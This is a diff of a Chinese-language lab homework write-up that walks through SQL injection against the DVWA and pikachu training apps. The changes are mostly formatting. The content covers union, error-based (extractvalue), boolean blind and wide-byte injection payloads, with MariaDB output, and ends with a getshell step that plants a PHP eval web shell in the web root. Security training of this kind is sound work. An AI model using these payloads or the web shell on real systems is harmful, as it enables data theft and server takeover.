@@ -1,30 +1,30 @@
-1. 分别在前端和后端使用 Union 注入实现“dvwa 数据库 -user 表 - 字段 -first_name 数据”的注入过程，写清楚注入步骤。
+#### 1. 分别在前端和后端使用 Union 注入实现“dvwa 数据库 -user 表 - 字段 -first_name 数据”的注入过程，写清楚注入步骤
 
-​	前端dvwa- SQL Injection注入页面(DVWA Security更改成low)：
+​ 前端dvwa- SQL Injection注入页面(DVWA Security更改成low)：
 
-​	a. 使用order by 来判断字段数，SQL Injection 注入框输入 `1' order by 2#` 显示正常，先判断字段数为2
+​ a. 使用order by 来判断字段数，SQL Injection 注入框输入 `1' order by 2#` 显示正常，先判断字段数为2
 
-​	b. 继续输入 `1' order by 3#` 显示异常，说明字段数为2
+​ b. 继续输入 `1' order by 3#` 显示异常，说明字段数为2
 
-​	c. 继续输入`1' union select 1,2#` 确定显示位
+​ c. 继续输入`1' union select 1,2#` 确定显示位
 
-​	d. 继续输入`1' union select database(),version()#`爆出数据库名和版本信息
+​ d. 继续输入`1' union select database(),version()#`爆出数据库名和版本信息
 
-​	![dvwa_database.png](images/dvwa_database.png)
+​ ![dvwa_database.png](images/dvwa_database.png)
 
-​	e. 使用information_schema表来爆出dvwa数据库包含的表 `1' union select 1,group_concat(table_name) from information_schema.tables where table_schema ='dvwa'#`
+​ e. 使用information_schema表来爆出dvwa数据库包含的表 `1' union select 1,group_concat(table_name) from information_schema.tables where table_schema ='dvwa'#`
 
-​	![dvwa_tables](images/dvwa_tables.png)
+​ ![dvwa_tables](images/dvwa_tables.png)
 
-​	f. 爆出user表的字段名 `1' UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'#`
+​ f. 爆出user表的字段名 `1' UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'#`
 
-​	![dvwa_users](images/dvwa_users.png)
+​ ![dvwa_users](images/dvwa_users.png)
 
-​	g. 列出first_name数据 `1' union select first_name,user from users#`
+​ g. 列出first_name数据 `1' union select first_name,user from users#`
 
-​	![dvwa_first_name](images/dvwa_first_name.png)
+​ ![dvwa_first_name](images/dvwa_first_name.png)
 
-​	后端数据库操作如下：	
+​ 后端数据库操作如下：
 
 ```bash
 MariaDB [(none)]> show databases;
@@ -103,25 +103,23 @@ MariaDB [dvwa]> SELECT first_name, last_name FROM users WHERE user_id = 1 union 
 5 rows in set (0.000 sec)
 ```
 
-
-
-2. 分别在前端和后端使用报错注入实现“dvwa 数据库 -user 表 - 字段”的注入过程，写清楚注入步骤，并回答下列关于报错注入的问题：
+#### 2. 分别在前端和后端使用报错注入实现“dvwa 数据库 -user 表 - 字段”的注入过程，写清楚注入步骤，并回答下列关于报错注入的问题
 
 前端注入思路，库名->表名->字段，在SQL Injection中输入:
 
 a. 爆库名，得到数据库名 dvwa
 
-`1' and extractvalue(1,concat(0x7e,database()));#` 
+`1' and extractvalue(1,concat(0x7e,database()));#`
 
 ![extractvalue_dvwa](images/extractvalue_dvwa.png)
 
-b. 爆表名users 
+b. 爆表名users
 
 `1' and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema='dvwa')));#`  得到dvwa库中有两张表
 
 `1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1)));#`  得到users表
 
-c. 爆列名字段 
+c. 爆列名字段
 
 `1' and extractvalue(1,concat(0x7e,(select count(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users')));#` 得到users表中有8个字段
 
@@ -202,31 +200,27 @@ MariaDB [dvwa]> SELECT first_name, last_name FROM users WHERE user_id = 1 and ex
 ERROR 1105 (HY000): XPATH syntax error: '~failed_login'
 ```
 
+​ 1）在 extractvalue 函数中，为什么’~'写在参数 1 的位置不报错，而写在参数 2 的位置报错？
 
+​   extractvalue（XML_document, xpath_string）
 
-​	1）在 extractvalue 函数中，为什么’~'写在参数 1 的位置不报错，而写在参数 2 的位置报错？
+​   第一个参数：string格式，为XML文档对象的名称
 
-​			extractvalue（XML_document, xpath_string）
+​   第二个参数：xpath_string（xpath格式的字符串），为XML文档的路径
 
-​			第一个参数：string格式，为XML文档对象的名称
+​   由于'\~'属于字符串string 格式，所以写在参数1位置不报错，'~'不属于文档路径格式，不属于xpath语法格式，因此写在参数2位置报出xpath语法错误。
 
-​			第二个参数：xpath_string（xpath格式的字符串），为XML文档的路径
+​ 2）报错注入中，为什么要突破单引号的限制，如何突破？
 
-​			由于'\~'属于字符串string 格式，所以写在参数1位置不报错，'~'不属于文档路径格式，不属于xpath语法格式，因此写在参数2位置报出xpath语法错误。
+​   SQL注入非常关键的一步就是让引号闭合和跳出引号，无法跳出引号，那么输入的内容就永远在引号里，输入的东西就永远是字符串，很显然这不符合SQL注入的要求。可以使用16进制代替特殊符号，规避单引号的限制。
 
-​	2）报错注入中，为什么要突破单引号的限制，如何突破？
+​ 3）在报错注入过程中，为什么要进行报错，是哪种类型的报错？
 
-​			SQL注入非常关键的一步就是让引号闭合和跳出引号，无法跳出引号，那么输入的内容就永远在引号里，输入的东西就永远是字符串，很显然这不符合SQL注入的要求。可以使用16进制代替特殊符号，规避单引号的限制。
+​   利用数据库报错来进行判断是否存在注入点，不符合数据库语法规则就会产生报错。报错注入过程中，函数语法的报错会将查询的结果放在报错信息里，即函数报错时会解析SQL语句，这样就得到我们想要的数据库信息。属于函数语法的报错。
 
-​	3）在报错注入过程中，为什么要进行报错，是哪种类型的报错？
+#### 3. 任选布尔盲注或者时间盲注在前端和后端实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤
 
-​			利用数据库报错来进行判断是否存在注入点，不符合数据库语法规则就会产生报错。报错注入过程中，函数语法的报错会将查询的结果放在报错信息里，即函数报错时会解析SQL语句，这样就得到我们想要的数据库信息。属于函数语法的报错。
-
-
-
-3. 任选布尔盲注或者时间盲注在前端和后端实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。
-
-​	a. 判断库名的长度，使用二分法判断得出数据库名长度为4
+​ a. 判断库名的长度，使用二分法判断得出数据库名长度为4
 
 ```
 1' and length(database())>10;# MISSING 
@@ -235,7 +229,7 @@ ERROR 1105 (HY000): XPATH syntax error: '~failed_login'
 1' and length(database())=4;# exists
 ```
 
-​	b. 猜测数据库库名，使用substr()函数和ascii码，把字符转换成数字来进行比较逻辑判断。
+​ b. 猜测数据库库名，使用substr()函数和ascii码，把字符转换成数字来进行比较逻辑判断。
 
 ```
 1' and ascii(substr(database(),1,1))>88;# exists 
@@ -286,7 +280,7 @@ ascii码等于97，得出第三个字母为a
 
 获取到当前数据库名称为dvwa
 
-​	c.猜测表的个数，如下得到dvwa中有两个表。
+​ c.猜测表的个数，如下得到dvwa中有两个表。
 
 ```
 1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')>1;# exists 
@@ -294,7 +288,7 @@ ascii码等于97，得出第三个字母为a
 1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2;# exists
 ```
 
-​	d. 猜解表的长度，并猜解表名
+​ d. 猜解表的长度，并猜解表名
 
 ```
 1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))>10;# MISSING 
@@ -338,7 +332,7 @@ ascii码等于97，得出第三个字母为a
 得到第二张表的表名是 users
 ```
 
-​	e. 猜解表中的字段名，以dvwa中的users表为例：
+​ e. 猜解表中的字段名，以dvwa中的users表为例：
 
 ```
 猜解users表中的字段数量
@@ -356,9 +350,7 @@ ascii码等于97，得出第三个字母为a
 
 ```
 
-
-
-​	后端数据库执行的命令如下：
+​ 后端数据库执行的命令如下：
 
 ```bash
 MariaDB [dvwa]> SELECT first_name, last_name FROM users WHERE user_id = 1 and length(database())>1;
@@ -653,9 +645,7 @@ MariaDB [dvwa]> select ascii(substr((select user from users limit 0,1),1,1));
 
 ```
 
-
-
-4. 利用宽字节注入实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。
+#### 4. 利用宽字节注入实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤
 
 a. pikachu中宽字节注入 `kobe運' union select database(),version()#`
 
@@ -667,15 +657,13 @@ b. 爆出表名 `kobe運' union select 1,group_concat(table_name) from informati
 
 c. 爆出member表的字段值 kobe運' union select 1,group_concat(column_name) from information_schema.columns where table_schema =database() and table_name='member'#
 
-这条语句在burp中执行不成功，pikachu中显示 您输入的username不存在，请重新输入！ 
+这条语句在burp中执行不成功，pikachu中显示 您输入的username不存在，请重新输入！
 
 输入 kobe運' or 1=1# 爆出uid和email
 
 ![memberlist](images/memberlist.png)
 
-
-
-5. 利用 SQL 注入实现 DVWA 站点的 Getshell，写清楚攻击步骤。
+#### 5. 利用 SQL 注入实现 DVWA 站点的 Getshell，写清楚攻击步骤
 
    a. 先构建一句话木马 <?php eval($_POST['a']);
 
@@ -728,8 +716,8 @@ drwxr-xr-x 1 www-data www-data  4096 Apr  8  2021 tests
 drwxr-xr-x 1 www-data www-data  4096 Apr  8  2021 vulnerabilities
 
 root@ce51c0404636:/var/www/html# cat test_shell.php
-admin	admin
-1	<?php eval($_POST['a']);
+admin admin
+1 <?php eval($_POST['a']);
 root@ce51c0404636:/var/www/html#
 ```
 
@@ -740,4 +728,3 @@ root@ce51c0404636:/var/www/html#
 ![getphpinfo](images/getphpinfo.png)
 
 ![getls](images/getls.png)
-
